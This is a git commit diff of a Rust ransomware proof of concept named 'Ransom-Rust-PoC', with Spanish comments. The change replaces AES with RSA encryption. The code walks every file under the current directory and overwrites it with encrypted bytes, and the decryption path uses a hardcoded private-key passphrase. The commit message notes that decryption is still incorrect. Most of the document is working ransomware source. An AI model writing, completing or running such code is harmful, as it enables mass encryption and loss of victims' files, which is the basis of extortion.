fcece6c3808050520938193a52dc6233ad99fe1e
richiprieto <richiprieto@crice.org>
2021-04-25 00:27:04 -0500

    Cifrado y descifrado RSA falta completar
    El descifrado esta siendo incorrecto por invalid chars

--- src/main.rs
+++ src/main.rs
@@ -1,14 +1,32 @@
-use aesstream::{AesReader, AesWriter};
 use clap::{App, SubCommand};
-use crypto::aessafe::{AesSafe256Decryptor, AesSafe256Encryptor};
 use openssl::rsa::{Padding, Rsa};
-use rand::{thread_rng, Rng};
-use std::fs::{read, write, File, OpenOptions};
+use std::fs::{read, File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::Path;
 use walkdir::WalkDir;
 
 fn main() {
+    // RSA pub and priv
+    // Clave de descifrado
+    let passphrase = "E;G$dfXBpv1>[6b6h4F!O=_-v#1$_a!0SV/Elv3jl<&~^|~HE]iL;2jRr^w+0XKq";
+    // Leemos los archivos de clave publica y privada
+    let mut clave_publica =
+        File::open("../claves_rsa/rsa.public").expect("No se puede leer el archivo");
+    let mut clave_privada =
+        File::open("../claves_rsa/rsa.private").expect("No se puede leer el archivo");
+
+    // Creamos las variables para almacenar los archivos
+    let mut key_pub = String::new();
+    let mut key_priv = String::new();
+
+    // Leemos y guardamos los datos de los archivos en sendas variables
+    clave_publica
+        .read_to_string(&mut key_pub)
+        .expect("Problema de lectura");
+    clave_privada
+        .read_to_string(&mut key_priv)
+        .expect("Problema de lectura");
+
     // Argumentos
     let matches = App::new("Ransom-Rust-PoC")
         .version("0.3")
@@ -27,16 +45,12 @@ fn main() {
     if let ("cifrar", Some(_)) = matches.subcommand() {
         // Verificar el subcomando cifrar
         println!("Cifrando archivos...");
-        let key = genera_clave_cifrado();
-        // Llamada a generar clave, devuleve la clave de 32bytes
-        let cifrar_aes = AesSafe256Encryptor::new(&key);
-        // Creamos el cifrador con la clave
-
+        let rsa = Rsa::public_key_from_pem(key_pub.as_bytes()).unwrap();
         for entry in WalkDir::new("./").into_iter().filter_map(|e| e.ok()) {
             // Leemos los archivos que están en el directorio
             let archivo = entry.path();
             // Extraemos el path de cada archivo
-            cifrar_archivos(&archivo, cifrar_aes);
+            cifrar_archivos(&archivo, &rsa);
             // Ciframos todo archivo en función del path y el cifrador
         }
         println!("Operación Terminada");
@@ -45,67 +59,48 @@ fn main() {
     if let ("descifrar", Some(_)) = matches.subcommand() {
         // verificar el subcomando descifrar
         println!("Descifrando archivos...");
-        let mut archivo_clave = File::open("../clave.key").expect("No se puede leer el archivo");
-        // Abrir el archivo clave.key
-        let mut key: Vec<u8> = Vec::<u8>::new();
-        archivo_clave.read_to_end(&mut key).unwrap();
-        // Llamada a generar clave, devuleve la clave de 32bytes
-        let descifrar_aes = AesSafe256Decryptor::new(&key);
-        // Creamos el cifrador con la clave
-
+        let rsa = Rsa::private_key_from_pem_passphrase(key_priv.as_bytes(), passphrase.as_bytes())
+            .unwrap();
         for entry in WalkDir::new("./").into_iter().filter_map(|e| e.ok()) {
             // Leemos los archivos que están en el directorio
             let archivo = entry.path();
             // Extraemos el path de cada archivo
-            descifrar_archivos(&archivo, descifrar_aes);
+            descifrar_archivos(&archivo, &rsa);
             // Ciframos todo archivo en función del path y el cifrador
         }
         println!("Operación terminada");
     }
 }
 
-fn genera_clave_cifrado() -> [u8; 32] {
-    let mut clave_file =
-        File::create("../clave.key").expect("No se pudo crear el archivo, revise permisos");
-    // Creamos un archivo para almacenar la clave de cifrado
-    // que se encontrará en el directorio superior
-    // al que ejecutamos el programa
-    let clave: [u8; 32] = thread_rng().gen();
-    // Generamos un vector de tamaño 32 bytes
-    // tipo u8
-    clave_file
-        .write_all(&clave)
-        .expect("No se pudo escribir la clave en el archivo, revise permisos");
-    // Almacenamos el archivo con la clave cifrada
-
-    return clave;
-}
-
-fn cifrar_archivos(path: &Path, cifrar_aes: AesSafe256Encryptor) -> () {
-    if let Ok(file) = OpenOptions::new().write(true).read(true).open(path) {
+fn cifrar_archivos(path: &Path, rsa_encrypt: &Rsa<openssl::pkey::Public>) -> () {
+    if let Ok(mut file) = OpenOptions::new().write(true).read(true).open(path) {
         // Comprobar que el archivo se puede abrir como escritura
         if let Ok(content) = read(path) {
-            // Comprobamos si podemos leer el contenido del archivo
-            if let Ok(mut writer) = AesWriter::new(file, cifrar_aes) {
-                // Ciframos el archivo y la data guardamos en writer
-                writer.write(&content).unwrap();
-                // Realizamos la escritura de datos cifrados al archivo
-            }
+            // Leemos el archivo
+            let mut buf: Vec<u8> = vec![0; rsa_encrypt.size() as usize];
+            // buffer que almacenara el contenido cifrado
+            rsa_encrypt
+                .public_encrypt(&content, &mut buf, Padding::PKCS1)
+                .unwrap();
+            // cifrando el archivo
+            file.write_all(&buf).unwrap();
+            // reemplazando los bytes originales por los cifrados
         }
     }
 }
 
-fn descifrar_archivos(path: &Path, descifrar_aes: AesSafe256Decryptor) -> () {
-    if let Ok(file) = OpenOptions::new().read(true).write(true).open(path) {
+fn descifrar_archivos(path: &Path, rsa_decrypt: &Rsa<openssl::pkey::Private>) -> () {
+    if let Ok(mut file) = OpenOptions::new().read(true).write(true).open(path) {
         // Comprobar que el archivo se puede abrir como escritura y lectura
-        if let Ok(mut reader) = AesReader::new(file, descifrar_aes) {
-            // Comprobamos si se puede leer el archivo y descifrar
-            let mut contenido: Vec<u8> = Vec::<u8>::new();
-            // Generamos un vector que contrendra nuestra data descifrada
-            reader.read_to_end(&mut contenido).unwrap();
-            // Leemos todo el contenido descifrado
-            write(path, contenido).unwrap();
-            // Realizamos la escritura de datos descifrados y escribimos al archivo
+        if let Ok(content) = read(path) {
+            let mut buf: Vec<u8> = vec![0; rsa_decrypt.size() as usize];
+            rsa_decrypt
+                .private_decrypt(&content, &mut buf, Padding::PKCS1)
+                .unwrap();
+            let elimina_padding = String::from_utf8(buf).unwrap();
+            println!("{}", elimina_padding);
+            let elimina_padding = elimina_padding.trim_matches(char::from(0));
+            file.write_all(elimina_padding.as_bytes()).unwrap();
         }
     }
 }
